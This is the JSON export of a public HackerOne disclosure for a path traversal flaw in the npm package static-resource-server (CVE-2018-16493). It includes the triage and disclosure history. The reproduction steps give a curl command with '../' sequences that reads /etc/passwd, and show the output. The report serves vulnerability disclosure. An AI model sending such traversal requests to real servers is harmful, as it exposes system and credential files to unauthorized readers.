{"id":432600,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzI2MDA=","url":"https://hackerone.com/reports/432600","title":"[static-resource-server]  Path Traversal allows to read content of arbitrary file on the server","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-11-01T06:25:40.078Z","submitted_at":"2018-11-01T06:25:40.078Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"libcontainer","url":"/libcontainer","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/236/940/4c781f48a5c547f9ce60b6406efcc61d322c11fb_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-16493"],"singular_disclosure_disabled":false,"disclosed_at":"2019-01-03T19:02:03.160Z","bug_reporter_agreed_on_going_public_at":"2019-01-03T19:02:03.056Z","team_member_agreed_on_going_public_at":"2019-01-03T18:45:29.467Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Module\n\n**module name:** static-resource-server\n**version:** 1.7.2\n**npm page:** `https://www.npmjs.com/package/static-resource-server`\n\n## Module Description\n\n\u003e A tiny http server that provides local static resource access \n\n## Module Stats\n\n\u003e Replace stats below with numbers from npm’s module page:\n\n[0] downloads in the last day\n[0] downloads in the last week\n[12] downloads in the last month\n\n~ 639 Downloads per Year\n\n# Vulnerability\n\n## Vulnerability Description\n\n\u003e Directory traversal through the url which doesn't verify the file is from the root directory path.\n\n## Steps To Reproduce:\n\n\u003e install static-resource-server using npm\n\n`$ npm install static-resource-server`\n\nrun server from command line:\n\n`$ ./static-resource-server -P 8080 --root $HOME/data/static`\n\nuse curl to try accessing internal files\n\n`$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd' `\n\nNow the corresponding file will be loaded from the server and sent as response to the client ( curl )\n\nResult:\n\n```\n##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false\n_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false\n\u003c\u003c\u003c MASKED DATA \u003e\u003e\u003e\n```\n\n\n## Supporting Material/References:\n\n- MacOS 10.14.1 \n- Node version v10.11.0\n- npm version  6.4.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: No\n- I opened an issue in the related repository: No\n\n## Impact\n\nThis vulnerability allows to read content of any file on the server","vulnerability_information_html":"\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e static-resource-server\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.7.2\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/static-resource-server\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA tiny http server that provides local static resource access \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eReplace stats below with numbers from npm’s module page:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e[0] downloads in the last day\u003cbr\u003e\n[0] downloads in the last week\u003cbr\u003e\n[12] downloads in the last month\u003c/p\u003e\n\n\u003cp\u003e~ 639 Downloads per Year\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDirectory traversal through the url which doesn\u0026#39;t verify the file is from the root directory path.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003einstall static-resource-server using npm\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003ccode\u003e$ npm install static-resource-server\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003erun server from command line:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ ./static-resource-server -P 8080 --root $HOME/data/static\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003euse curl to try accessing internal files\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ curl --path-as-is --url \u0026#39;http://127.0.0.1:8080/../../../../etc/passwd\u0026#39;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eNow the corresponding file will be loaded from the server and sent as response to the client ( curl )\u003c/p\u003e\n\n\u003cp\u003eResult:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false\n_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false\n\u0026lt;\u0026lt;\u0026lt; MASKED DATA \u0026gt;\u0026gt;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eMacOS 10.14.1 \u003c/li\u003e\n\u003cli\u003eNode version v10.11.0\u003c/li\u003e\n\u003cli\u003enpm version  6.4.1\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: No\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: No\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability allows to read content of any file on the server\u003c/p\u003e\n","weakness":{"id":89,"name":"Information Exposure Through Directory Listing"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-02-02T18:45:29.589Z","allow_singular_disclosure_after":-60088317.452558905,"singular_disclosure_allowed":true,"vote_count":5,"voters":["libcontainer","bl4de","an0nym0us","rdes","reppie"],"severity":{"rating":"high","score":8.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"high"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3568296,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-11-01T06:25:46.988Z","updated_at":"2018-11-01T06:25:46.988Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3623003,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @shivasurya ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi @shivasurya ,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-10T17:58:21.422Z","updated_at":"2018-11-10T17:58:21.422Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3623024,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Maintainer contacted","markdown_message":"\u003cp\u003eMaintainer contacted\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-10T18:08:07.546Z","updated_at":"2018-11-10T18:08:07.546Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3859472,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates @e_lexy  ?","markdown_message":"\u003cp\u003eAny updates \u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e  ?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T08:47:53.740Z","updated_at":"2018-12-18T08:47:53.740Z","actor":{"username":"libcontainer","cleared":false,"url":"/libcontainer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/940/4c781f48a5c547f9ce60b6406efcc61d322c11fb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921337,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-03T18:43:20.554Z","updated_at":"2019-01-03T18:43:20.554Z","additional_data":{"old_severity":"High","new_severity":"High (8.6)","old_severity_id":233150,"new_severity_id":274525},"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921346,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"No response yet. I contacted the Author in various ways without any response. Seeing as this has a low download count I'll move to resolve and disclose so I can request a CVE","markdown_message":"\u003cp\u003eNo response yet. I contacted the Author in various ways without any response. Seeing as this has a low download count I\u0026#39;ll move to resolve and disclose so I can request a CVE\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T18:45:18.848Z","updated_at":"2019-01-03T18:45:18.848Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"libcontainer","url":"/libcontainer"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921347,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-03T18:45:29.504Z","updated_at":"2019-01-03T18:45:29.504Z","first_to_agree":true,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921414,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-03T19:02:03.089Z","updated_at":"2019-01-03T19:02:03.089Z","actor":{"username":"libcontainer","cleared":false,"url":"/libcontainer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/940/4c781f48a5c547f9ce60b6406efcc61d322c11fb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921415,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-03T19:02:03.183Z","updated_at":"2019-01-03T19:02:03.183Z","actor":{"username":"libcontainer","cleared":false,"url":"/libcontainer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/940/4c781f48a5c547f9ce60b6406efcc61d322c11fb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"[CVE requested](https://hackerone.com/nodejs-ecosystem/cve_requests/1285/edit)","markdown_message":"\u003cp\u003e\u003ca href=\"https://hackerone.com/nodejs-ecosystem/cve_requests/1285/edit\"\u003eCVE requested\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T19:05:21.995Z","updated_at":"2019-01-03T19:06:21.570Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4062149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@e_lexy any updates ?","markdown_message":"\u003cp\u003e\u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e any updates ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T04:18:44.968Z","updated_at":"2019-01-30T04:18:44.968Z","actor":{"username":"libcontainer","cleared":false,"url":"/libcontainer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/940/4c781f48a5c547f9ce60b6406efcc61d322c11fb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}